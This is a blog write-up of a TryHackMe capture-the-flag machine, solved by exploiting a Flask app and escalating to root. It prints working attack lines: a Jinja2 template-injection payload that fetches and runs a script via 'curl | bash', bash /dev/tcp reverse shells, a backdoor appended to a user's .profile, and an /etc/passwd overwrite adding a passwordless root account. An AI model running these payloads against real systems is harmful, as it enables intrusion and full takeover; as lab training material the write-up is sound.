---
layout: post
title:  "Super Secret Tip (THM)"
date:   2025-08-01 23:48:43 -0400
author: robo.uzi
tags: [CTF, TryHackMe]
---

Prompt: Well, Well, Well, you're here, and I am glad to see that! Your task is simple.. well, not really.. I mean, it's kind of.. but.. anyways... I was debugging my work and forgot about some _probably_ harmful code, and sadly, I lost access to my machine. :( Could you find my valuable information for me? Don't forget to enjoy the journey while at it.

## Initial Compromise

`nmap -p- -T5 -vv 10.10.147.95 -oN secretfullnmap.txt`

`nmap -sVC -p 22,7777 -vv -T4 10.10.5.98 -oN secretnmap.txt`: 
```shell
PORT     STATE SERVICE REASON  VERSION  
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
7777/tcp open  cbt?    syn-ack  
| fingerprint-strings:    
|   GetRequest:    
|     HTTP/1.1 200 OK  
|     Server: Werkzeug/2.3.4 Python/3.11.0  
|     Date: Mon, 28 Jul 2025 02:45:15 GMT  
|     Content-Type: text/html; charset=utf-8  
|     Content-Length: 5688  
|     Connection: close
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The server says `Werkzeug/2.3.4 Python/3.11.0`. This hints towards `Flask`.

Run ffuf on port `7777`:
```shell
ffuf -u http://10.10.147.95:7777/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -mc 200,301,302,403 -fs 5688 -t 50

cloud        [Status: 200, Size: 2991, Words: 904, Lines: 80, Duration: 225ms]  
debug        [Status: 200, Size: 1957, Words: 672, Lines: 69, Duration: 215ms]
```

I go to `http://10.10.147.95:7777/debug` and test the page. Once I test it the link looks like this: `http://10.10.147.95:7777/debug?debug=1337+*+1337&password=test`. The page requires a password so I check out `/cloud`. 

At `http://10.10.147.95:7777/cloud` I see 7 files. Im able to download 4 of them:
```shell
file *  
IMG_1425.NEF: RIFF (little-endian) data, Web/P image, VP8 encoding, 621x414, Scaling: [none]x[none], YUV color, decoders should clamp  
MyApp.apk:    ASCII text, with no line terminators  
templates.py: Python script, ASCII text executable  
VID_0022.MOV: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 232x217, components 3
```

The files seem empty. I try to fuzz for any type of python file I can download: 
```shell
ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/common.txt -u http://10.10.158.95:7777/cloud -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "download=FUZZ.py" -fc 404,400

source        [Status: 200, Size: 2898, Words: 529, Lines: 87, Duration: 219ms]  
templates     [Status: 200, Size: 45, Words: 6, Lines: 4, Duration: 216ms]
```

To download `source.py` I run:
```shell
curl http://10.10.158.95:7777/cloud -X POST -d 'download=source.py'
```
```shell
from flask import *  
import hashlib  
import os  
import ip # from .  
import debugpassword # from .  
import pwn  
  
app = Flask(__name__)  
app.secret_key = os.urandom(32)  
password = str(open('supersecrettip.txt').readline().strip())  
  
def illegal_chars_check(input):  
   illegal = "'&;%"  
   error = ""  
   if any(char in illegal for char in input):  
       error = "Illegal characters found!"  
       return True, error  
   else:  
       return False, error  
  
@app.route("/cloud", methods=["GET", "POST"])    
def download():  
   if request.method == "GET":  
       return render_template('cloud.html')  
   else:  
       download = request.form['download']  
       if download == 'source.py':  
           return send_file('./source.py', as_attachment=True)  
       if download[-4:] == '.txt':  
           print('download: ' + download)  
           return send_from_directory(app.root_path, download, as_attachment=True)  
       else:  
           return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)  
           # return render_template('cloud.html', msg="Network error occurred")  
  
@app.route("/debug", methods=["GET"])    
def debug():  
   debug = request.args.get('debug')  
   user_password = request.args.get('password')  
      
   if not user_password or not debug:  
       return render_template("debug.html")  
   result, error = illegal_chars_check(debug)  
   if result is True:  
       return render_template("debug.html", error=error)  
  
   # I am not very eXperienced with encryptiOns, so heRe you go!  
   encrypted_pass = str(debugpassword.get_encrypted(user_password))  
   if encrypted_pass != password:  
       return render_template("debug.html", error="Wrong password.")  
      
      
   session['debug'] = debug  
   session['password'] = encrypted_pass  
          
   return render_template("debug.html", result="Debug statement executed.")  
  
@app.route("/debugresult", methods=["GET"])    
def debugResult():  
   if not ip.checkIP(request):  
       return abort(401, "Everything made in home, we don't like intruders.")  
      
   if not session:  
       return render_template("debugresult.html")  
      
   debug = session.get('debug')  
   result, error = illegal_chars_check(debug)  
   if result is True:  
       return render_template("debugresult.html", error=error)  
   user_password = session.get('password')  
      
   if not debug and not user_password:  
       return render_template("debugresult.html")  
          
   # return render_template("debugresult.html", debug=debug, success=True)  
      
   # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS  
   template = open('./templates/debugresult.html').read()  
   return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")  
  
@app.route("/", methods=["GET"])  
def index():  
   return render_template('index.html')  
  
if __name__ == "__main__":  
   app.run(host="0.0.0.0", port=7777, debug=False)
```

I see `supersecrettip.txt` in the script and download it:
```shell
curl http://10.10.158.95:7777/cloud -X POST -d 'download=supersecrettip.txt'

b'\x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

In the python server this seems relevant:
```shell
# I am not very eXperienced with encryptiOns, so heRe you go!  
   encrypted_pass = str(debugpassword.get_encrypted(user_password))  
   if encrypted_pass != password:  
       return render_template("debug.html", error="Wrong password.")  
```
`I am not very eXperienced with encryptiOns, so heRe` hints at `XOR`. Though to XOR it I need the key with which they did it. The import statement `import debugpassword # from .` and the use of `debugpassword` in the above code tells me I need to download `debugpassword.py`.

Upon running `curl http://10.10.158.95:7777/cloud -X POST -d 'download=debugpassword.py'` I see it will not work. Looking at the code more I see I can only download `source.py` and files that end with `.txt`. 

After a while I figure out I can download the file with the help of a null byte `%00` and appending `.txt`. 
```shell
curl http://10.10.158.95:7777/cloud -X POST -d 'download=debugpassword.py%00.txt'

import pwn  
  
def get_encrypted(passwd):  
   return pwn.xor(bytes(passwd, 'utf-8'), b'redacted')
```

To get the password I run `python3 -m venv venv`, then `source venv/bin/activate`, then `pip install pwntools`. My python script looks like this:
```python
from pwn import xor  
  
cipher = b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'  
key = b'redacted'  
  
# XOR again to decrypt  
password = xor(cipher, key)  
print(password.decode())
```
I run it and get the password. 

I am able to supply the password and see `Debug statement executed.`. I look back at the python server and see it is doing an ip check and if it fails returns a `401`. Now I read the `ip` module being imported:
```shell
curl http://10.10.158.95:7777/cloud -X POST -d 'download=ip.py%00.txt'
```
```shell
host_ip = "127.0.0.1"  
def checkIP(req):  
   try:  
       return req.headers.getlist("X-Forwarded-For")[0] == host_ip  
   except:  
       return req.remote_addr == host_ip
```
From this I can see I need to include the http header: `X-Forwarded-For: 127.0.0.1`. 

From looking at the `debugresult()` function in the python server I see I also need the session cookie from successfuly executing a debug statement. I get that with curl: 
```shell
curl -I 'http://10.10.158.95:7777/debug?debug=1337*1337&password=redacted'

Set-Cookie: session=.eJyrVkpJTSpNV7JSMjQ2NtcCEUo6SgWJxcXl-UUpQOEkdYWYmAoDAzRCFUgaJsfEFIF4xiCOBYhlBmKlqivVAgB6iRqU.aIfZOg.O0zSYwnmkOVudHHNrC3-6fMeH7w
```

I put it all together to see the `debugresult` page:
```shell
curl 'http://10.10.158.95:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJyrVkpJTSpNV7JSMjQ2NtcCEUo6SgWJxcXl-UUpQOEkdYWYmAoDAzRCFUgaJsfEFIF4xiCOBYhlBmKlqivVAgB6iRqU.aIfZOg.O0zSYwnmkOVudHHNrC3-6fMeH7w'

<!DOCTYPE html>  
<html lang="en">  
<head>
</head>
<body>  
   <div class="main">  
       <h1 class="title">Debugging Results</h1>  
<pre>  
<code>  
┌──(ayham㉿AM-Kali)-[~]  
└─$ debugging  
<span class="result">1337*1337</span>  
```
{% raw %}
I can see here the input from the debug statement is reflected on the page. Since this is running flask, it should be vulnerable to `Server Side Template Injection`. If I create a debug statement with the value `{{5*5}}` and the output is `25` that will confirm it.
{% endraw %}
Running these confirms it:
```shell
curl -I 'http://10.10.158.95:7777/debug?debug=\{\{5*5\}\}&password=redacted'

curl 'http://10.10.158.95:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJyrVkpJTSpNV7JSqq421TKtrVXSUSpILC4uzy9KAQomqSvExFQYGKARqkDSMDkmpgjEMwZxLEAsMxArVV2pFgCosxtS.aIfbKQ.Et9Z18UG7_91cUiqFP4CYNyjfUg'

┌──(ayham㉿AM-Kali)-[~]  
└─$ debugging  
<span class="result">25</span>
```
{% raw %}
Ok good. On `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---remote-command-execution` I find a suitable payload to make a reverse shell. I had to add `+` in the whitespace: `{{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+10.13.66.123:8000/shell.sh+|+bash").read()+}}`. I need to use this because the server is checking for these special characters `'&;%` and not allowing them.
{% endraw %}
I create the reverse shell file `shell.sh` which contains `bash -i >& /dev/tcp/10.13.66.123/4444 0>&1`. In the directory with the file run `python3 -m http.server` Setup a listener with `nc -lvnp 4444` and run:
```shell
curl -I 'http://10.10.158.95:7777/debug?debug=\{\{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+10.13.66.123:8000/shell.sh+|+bash").read()+\}\}&password=redacted'

curl 'http://10.10.158.95:7777/debugresult' -H 'X-Forwarded-For: 127.0.0.1' -b 'session=.eJxdjuEKgyAUhV9FLowKhtMFMXoWQbRcCXcp3mKD1rtPt3_7c_g-OAfODqOz2wQ97Dsjh3eutV_8qnWGCYM1SF-2m8fVLz_xjxhS7tQKAiloeAzRLdmGLSGTgsuWdx2X17a_CSEuNDtETjN7M2toLovkzFg37DjgDNEQPUMa8wtbMaVeQvzFKacclErF2iK3Ql0hV8HxAQ5nQKc.aIfkgA.mJZ3S9zEhd007lf-sIhE9HzkrRI'
```
With that I catch the shell.

___

## Privilege Escalation

I find `flag1.txt` in `/home/ayham`. I see another user called `F30s`. I go into `F30s` home directory and see I have write permissions on `.profile`. This file is executed whenever a user logs in. 

I echo a reverse shell into this file and set a listener to wait and see if I can get a shell as `F30s`. 
```shell
echo 'bash -c "bash -i >& /dev/tcp/10.13.66.123/5555 0>&1"' >> .profile
```
After a minute I get a shell.

I run `ps aux` and see `/home/F30s/health_check` is running. The other file is `site_check`. I see whats in both files:
```shell
cat health_check  
Health: 1337/100

cat site_check  
url = "http://127.0.0.1/health_check"
```
This is basically a curl config file which I can edit.

To test it I modified the `site_check` to :
```shell
url = "http://10.13.66.123:8000/text.txt"
output = "/tmp/text.txt"
```

I can see it works and saves the file as root:
```shell
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
10.10.158.95 - - [28/Jul/2025 17:26:03] "GET /text.txt HTTP/1.1" 200 -

F30s@482cbf2305ae:/tmp$ ls -la
total 12  
drwxrwxrwt 1 root root 4096 Jul 28 21:26 .  
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..  
-rw-r--r-- 1 root root    5 Jul 28 21:26 text.txt
```

Now I save `/etc/passwd` to my machine and add the line `root1::0:0:root1:/home/root1:/bin/bash`. I host another python server and modify `site_check` to contain:
```shell
url = "http://10.13.66.123:8000/passwd"
output = "/etc/passwd"
```
After it downloads I run `su root1` and become root! 

I get to `/root` and see this:
```shell
root@482cbf2305ae:/root# cat flag2.txt  
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'  
root@482cbf2305ae:/root# cat secret.txt  
b'C^_M@__DC\\7,'
```
Looks encrypted. `secret.txt` seems to be the key. I look around for more useful files. In `/` I find `secret-tip.txt`:
```shell
A wise *gpt* once said ...  
In the depths of a hidden vault, the mastermind discovered that vital ▒▒▒▒▒ of their secret ▒▒▒▒▒▒ had vanished without a trace. They knew their ▒▒▒▒▒▒▒ was now vulnerable to  
disruption, setting in motion a desperate race against time to recover the missing ▒▒▒▒▒▒ before their ▒▒▒▒▒▒▒ unraveled before their eyes.  
So, I was missing 2 .. hmm .. what were they called? ... I actually forgot, anyways I need to remember them, they're important. The past/back/before/not after actually matters  
, follow it!  
Don't forget it's always about root!
```
At this point I took a break. What I need to do is create a wordlist from `secret-tip.txt` and use them as keys to XOR for the last flag. I took the file and told chatGPT to put each word on a new line and remove all special characters and whitespace.

I make a python script to go through the wordlist and XOR for the key:
```python
from pwn import xor

def main():
    ciphertext = b'C^_M@__DC\\7,'

    with open('wordlist.txt', 'r') as key_file:
        keys = [line.strip() for line in key_file]

    for key in keys:
        key_bytes = key.encode()
        decrypted = xor(ciphertext, key_bytes)

        if all(32 <= byte <= 126 for byte in decrypted):
            print(f"Key: '{key}', Decrypted Text: '{decrypted.decode()}'")

if __name__ == "__main__":
    main()
```
This is the only readable output I get: `Key: 'root', Decrypted Text: '1109200013XX'`. Looks like all numbers except the last 2. 

```python
from pwn import xor

cipher = b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'

for i in range(10, 100):
    key = f'1109200013{i}'.encode()
    decrypted = xor(cipher, key)
    try:
        text = decrypted.decode()
        if text.endswith('}'):
            print(f"Key: {key.decode()}, Decrypted: {text}")
    except UnicodeDecodeError:
        continue
```
I find the flag at: `Key: 110920001386`.

The end!

___
